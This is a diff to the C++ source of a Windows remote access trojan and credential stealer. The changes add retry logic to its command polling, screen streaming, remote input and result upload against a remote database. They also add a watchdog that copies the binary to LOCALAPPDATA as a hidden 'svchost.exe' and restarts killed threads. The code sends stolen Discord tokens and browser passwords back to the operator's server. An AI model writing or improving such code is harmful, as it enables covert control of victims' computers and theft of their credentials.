@@ -105,8 +105,9 @@ std::string httpsGet(const std::string& path) {
     if (!c) { WinHttpCloseHandle(s); return ""; }
     HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
     if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
-    WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
-    WinHttpReceiveResponse(r, 0);
+    if (!WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0) || !WinHttpReceiveResponse(r, 0)) {
+        WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "";
+    }
     std::string out; DWORD n; char buf[256];
     while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
     WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
@@ -115,14 +116,15 @@ std::string httpsGet(const std::string& path) {
 
 std::string httpsDelete(const std::string& path) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
-    if (!s) return "";
+    if (!s) return "err";
     WinHttpSetTimeouts(s, 5000, 5000, 5000, 5000);
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
-    if (!c) { WinHttpCloseHandle(s); return ""; }
+    if (!c) { WinHttpCloseHandle(s); return "err"; }
     HINTERNET r = WinHttpOpenRequest(c, L"DELETE", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
-    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
-    WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
-    WinHttpReceiveResponse(r, 0);
+    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err"; }
+    if (!WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0) || !WinHttpReceiveResponse(r, 0)) {
+        WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err";
+    }
     WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
     return "";
 }
@@ -143,8 +145,51 @@ std::string httpsGetUrl(const std::string& host, const std::string& path) {
     return out;
 }
 
+// Retry wrapper: tries 3 times with 1s backoff
+std::string httpsGetRetry(const std::string& path) {
+    for (int i = 0; i < 3; i++) {
+        std::string r = httpsGet(path);
+        if (!r.empty() && r != "err") return r;
+        Sleep(1000);
+    }
+    return "";
+}
+std::string httpsPatchRetry(const std::string& path, const std::string& body) {
+    for (int i = 0; i < 3; i++) {
+        std::string r = httpsPatch(path, body);
+        if (!r.empty() && r != "err") return r;
+        Sleep(1000);
+    }
+    return "";
+}
+std::string httpsPostRetry(const std::string& path, const std::string& body) {
+    for (int i = 0; i < 3; i++) {
+        std::string r = httpsPost(path, body);
+        if (!r.empty() && r != "err") return r;
+        Sleep(1000);
+    }
+    return "";
+}
+std::string httpsPutRetry(const std::string& path, const std::string& body) {
+    for (int i = 0; i < 3; i++) {
+        std::string r = httpsPut(path, body);
+        if (!r.empty() && r != "err") return r;
+        Sleep(1000);
+    }
+    return "";
+}
+std::string httpsDeleteRetry(const std::string& path) {
+    for (int i = 0; i < 3; i++) {
+        std::string r = httpsDelete(path);
+        if (r.empty()) return r; // delete returns empty on success
+        Sleep(1000);
+    }
+    return "";
+}
+
 std::string getPublicIP() {
-    std::string r = httpsGetUrl("api.ipify.org", "/");
+    std::string r;
+    for (int i = 0; i < 3 && r.empty(); i++) { r = httpsGetUrl("api.ipify.org", "/"); Sleep(500); }
     if(r.empty()) r = httpsGetUrl("icanhazip.com", "/");
     while(!r.empty()&&(r.back()=='\n'||r.back()=='\r')) r.pop_back();
     return r.empty()?"unknown":r;
@@ -776,7 +821,7 @@ void sendPing() {
         "\"uptime\":" + std::to_string(GetTickCount64() / 1000) + ","
         "\"version\":\"2.0\""
         "}";
-    httpsPut("/pings/" + fbEsc(computerName) + ".json", body);
+    httpsPutRetry("/pings/" + fbEsc(computerName) + ".json", body);
 }
 
 std::string listProcesses() {
@@ -1485,7 +1530,7 @@ DWORD WINAPI pollThread(LPVOID) {
         if(++pingCtr>=300){pingCtr=0;try{if(!g_noPing)sendPing();}catch(...){}}
         try {
             std::string path = "/commands/" + fbEsc(computerName) + ".json";
-            std::string resp = httpsGet(path);
+            std::string resp = httpsGetRetry(path);
             if (resp.empty() || resp == "null" || resp.size() < 5) continue;
             size_t pos = 0;
             while ((pos = resp.find("\":{", pos)) != std::string::npos) {
@@ -1564,7 +1609,7 @@ DWORD WINAPI pollThread(LPVOID) {
                             auto* d = (std::pair<std::string,std::string>*)p;
                             std::string r = jsonEscape(getDiscordTokens());
                             std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
-                            httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
+                            httpsPatchRetry("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
                             delete d;
                             } catch(...) {}
                             return 0;
@@ -1577,7 +1622,7 @@ DWORD WINAPI pollThread(LPVOID) {
                             auto* d = (std::pair<std::string,std::string>*)p;
                             std::string r = jsonEscape(getBrowserPasswords());
                             std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
-                            httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
+                            httpsPatchRetry("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
                             delete d;
                             } catch(...) {}
                             return 0;
@@ -1610,7 +1655,7 @@ DWORD WINAPI pollThread(LPVOID) {
                 } catch(...) { result = "exec_err"; }
                 std::string escaped = jsonEscape(result);
                 std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
-                httpsPatch("/commands/" + fbEsc(computerName) + "/" + key + ".json", resBody);
+                httpsPatchRetry("/commands/" + fbEsc(computerName) + "/" + key + ".json", resBody);
                 pos = objEnd;
             }
         } catch(...) {}
@@ -1630,7 +1675,7 @@ DWORD WINAPI screenThread(LPVOID) {
             std::string ts = getTimestamp();
             char scaleStr[16]; sprintf(scaleStr, "%.2f", g_liveScale);
             std::string body = "{\"r\":\"" + escaped + "\",\"t\":\"" + ts + "\",\"q\":" + std::to_string(g_liveQuality) + ",\"s\":" + std::string(scaleStr) + "}";
-            httpsPut("/live/" + fbEsc(computerName) + ".json", body);
+            httpsPutRetry("/live/" + fbEsc(computerName) + ".json", body);
         } catch(...) {}
         DWORD elapsed = GetTickCount() - t0;
         if (elapsed < 100) Sleep(100 - elapsed);
@@ -1645,7 +1690,7 @@ DWORD WINAPI inputThread(LPVOID) {
     while(true) {
         Sleep(15);
         try {
-            std::string resp = httpsGet("/input/" + fbEsc(computerName) + ".json");
+            std::string resp = httpsGetRetry("/input/" + fbEsc(computerName) + ".json");
             if (resp.empty() || resp == "null" || resp.size() < 5) continue;
             bool hasEvents = false;
             size_t pos = 0;
@@ -1672,7 +1717,7 @@ DWORD WINAPI inputThread(LPVOID) {
                 } catch(...) {}
                 pos = objEnd;
             }
-            if (hasEvents) httpsDelete("/input/" + fbEsc(computerName) + ".json");
+            if (hasEvents) httpsDeleteRetry("/input/" + fbEsc(computerName) + ".json");
         } catch(...) {}
     }
     } catch(...) {}
@@ -1712,6 +1757,40 @@ LONG WINAPI crashHandler(EXCEPTION_POINTERS*) {
     return EXCEPTION_CONTINUE_EXECUTION;
 }
 
+// Thread handles for watchdog
+HANDLE g_hPoll = 0, g_hInput = 0, g_hScreen = 0;
+DWORD WINAPI watchdogThread(LPVOID) {
+    while (true) {
+        Sleep(5000);
+        // Self-repair: if deleted from LocalAppData, re-copy
+        char exePath[MAX_PATH];
+        if (GetModuleFileNameA(NULL, exePath, MAX_PATH) > 0) {
+            char la[MAX_PATH];
+            if (GetEnvironmentVariableA("LOCALAPPDATA", la, MAX_PATH) > 0) {
+                std::string dest = std::string(la) + "\\svchost.exe";
+                if (_stricmp(exePath, dest.c_str()) != 0 && GetFileAttributesA(dest.c_str()) == INVALID_FILE_ATTRIBUTES) {
+                    CopyFileA(exePath, dest.c_str(), FALSE);
+                    SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+                }
+            }
+        }
+        // Restart dead threads
+        if (g_hPoll) {
+            DWORD r = WaitForSingleObject(g_hPoll, 0);
+            if (r == WAIT_OBJECT_0) { CloseHandle(g_hPoll); g_hPoll = CreateThread(0, 0, pollThread, 0, 0, 0); }
+        } else g_hPoll = CreateThread(0, 0, pollThread, 0, 0, 0);
+        if (g_hInput) {
+            DWORD r = WaitForSingleObject(g_hInput, 0);
+            if (r == WAIT_OBJECT_0) { CloseHandle(g_hInput); g_hInput = CreateThread(0, 0, inputThread, 0, 0, 0); }
+        } else g_hInput = CreateThread(0, 0, inputThread, 0, 0, 0);
+        if (g_hScreen) {
+            DWORD r = WaitForSingleObject(g_hScreen, 0);
+            if (r == WAIT_OBJECT_0) { CloseHandle(g_hScreen); g_hScreen = CreateThread(0, 0, screenThread, 0, 0, 0); }
+        } else g_hScreen = CreateThread(0, 0, screenThread, 0, 0, 0);
+    }
+    return 0;
+}
+
 int main(int argc, char* argv[]) {
     SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
     SetUnhandledExceptionFilter(crashHandler);
@@ -1749,9 +1828,10 @@ int main(int argc, char* argv[]) {
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-    CreateThread(0, 0, pollThread, 0, 0, 0);
-    CreateThread(0, 0, inputThread, 0, 0, 0);
-    if (!noScreen) CreateThread(0, 0, screenThread, 0, 0, 0);
+    g_hPoll = CreateThread(0, 0, pollThread, 0, 0, 0);
+    g_hInput = CreateThread(0, 0, inputThread, 0, 0, 0);
+    if (!noScreen) g_hScreen = CreateThread(0, 0, screenThread, 0, 0, 0);
+    CreateThread(0, 0, watchdogThread, 0, 0, 0);
     // Keep alive - threads do all the work
     while (true) Sleep(10000);
     } catch(...) { return 1; }
